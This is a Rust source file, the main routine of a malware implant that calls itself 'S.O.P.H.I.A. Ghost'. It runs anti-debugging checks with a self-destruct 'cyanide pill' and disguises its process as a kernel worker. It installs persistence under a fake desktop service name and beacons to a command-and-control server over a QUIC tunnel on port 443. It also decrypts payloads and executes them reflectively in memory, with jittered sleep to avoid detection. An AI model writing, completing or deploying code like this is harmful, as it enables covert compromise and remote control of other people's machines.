mod crypto;
mod stealth;
mod comm;
mod defense;

use sophia_macros::{obfuscate, encrypt_string};
use crypto::GhostVault;
use stealth::{masquerade, setup_persistence, reflective_exec};
use comm::Oracle;
use defense::{check_ptrace, trigger_cyanide_pill, set_self_destruct};
use tokio::time::sleep;

#[tokio::main]
#[obfuscate]
async fn main() {
    set_self_destruct();
    if check_ptrace() {
        trigger_cyanide_pill();
    }

    let fake_name = encrypt_string!("[kworker/u4:0]");
    masquerade(&fake_name);

    let vault = GhostVault::new();
    let oracle = Oracle::new();

    let svc_name = encrypt_string!("tracker-miner-fs");
    let svc_path = encrypt_string!("/tmp/sophia_stager");
    let _ = setup_persistence(&svc_name, &svc_path);

    loop {
        let c2_ip = oracle.resolve_c2();
        if let Ok(addr) = format!("{}:443", c2_ip).parse() {
            let _ = oracle.establish_quic_tunnel(addr).await;
        }

        println!("{}", encrypt_string!("S.O.P.H.I.A. Ghost heartbeat active."));

        let dummy_ciphertext = vec![0u8; 64];
        let dummy_nonce = vec![0u8; 24];

        match vault.decrypt(&dummy_ciphertext, &dummy_nonce) {
            Ok(payload) => {
                if !payload.is_empty() && payload[0] == 0x7F {
                    let _ = reflective_exec(&payload, &fake_name);
                }
            }
            Err(_) => {
                println!("{}", encrypt_string!("Environmental mismatch. Initiating innocent crash..."));
                unsafe {
                    let garbage_fn: fn() = std::mem::transmute(dummy_ciphertext.as_ptr());
                    garbage_fn();
                }
            }
        }

        let jitter = oracle.get_jitter_sleep();
        sleep(jitter).await;

        if check_ptrace() {
            trigger_cyanide_pill();
        }
    }
}
